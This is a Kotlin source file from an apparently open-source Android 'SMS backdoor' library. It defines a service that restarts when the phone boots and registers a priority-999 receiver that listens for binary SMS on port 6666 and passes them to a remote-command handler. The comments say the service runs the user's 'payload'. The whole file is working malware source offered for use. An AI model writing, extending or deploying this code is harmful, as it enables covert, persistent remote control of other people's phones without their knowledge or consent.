/*
Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package com.evilthreads.smsbackdoor

import android.content.IntentFilter
import android.provider.Telephony
import com.candroid.bootlaces.LifecycleBootService

/*
            (   (                ) (             (     (
            )\ ))\ )    *   ) ( /( )\ )     (    )\ )  )\ )
 (   (   ( (()/(()/(  ` )  /( )\()|()/((    )\  (()/( (()/(
 )\  )\  )\ /(_))(_))  ( )(_)|(_)\ /(_))\((((_)( /(_)) /(_))
((_)((_)((_|_))(_))   (_(_()) _((_|_))((_))\ _ )(_))_ (_))
| __\ \ / /|_ _| |    |_   _|| || | _ \ __(_)_\(_)   \/ __|
| _| \ V /  | || |__    | |  | __ |   / _| / _ \ | |) \__ \
|___| \_/  |___|____|   |_|  |_||_|_|_\___/_/ \_\|___/|___/
....................../´¯/)
....................,/¯../
.................../..../
............./´¯/'...'/´¯¯`·¸
........../'/.../..../......./¨¯\
........('(...´...´.... ¯~/'...')
.........\.................'...../
..........''...\.......... _.·´
............\..............(
..............\.............\...
*/
/**
* @author Chris Basinger
* @email evilthreads669966@gmail.com
* @date 10/08/20
*
* A [LifecycleBootService] that handles registering the receiver for [RemoteCommandReceiver]. This is required to receive binary sms messages.
* This is started for you inside of [SmsBackdoor.openDoor]. This service component will restart when the device is restarted.
 * [BackdoorService] will run your payload within [BackdoorService.init] using [LifecycleScope.launchWhenCreated].
* */
internal class BackdoorService : LifecycleBootService(){
    private lateinit var receiver: RemoteCommandReceiver

    override fun onCreate() {
        super.onCreate()
        val filter = IntentFilter(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION).apply {
            addDataAuthority("*", "6666")
            addDataScheme("sms")
            priority = 999
        }
        receiver = RemoteCommandReceiver()
        registerReceiver(receiver, filter)
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(receiver)
    }
}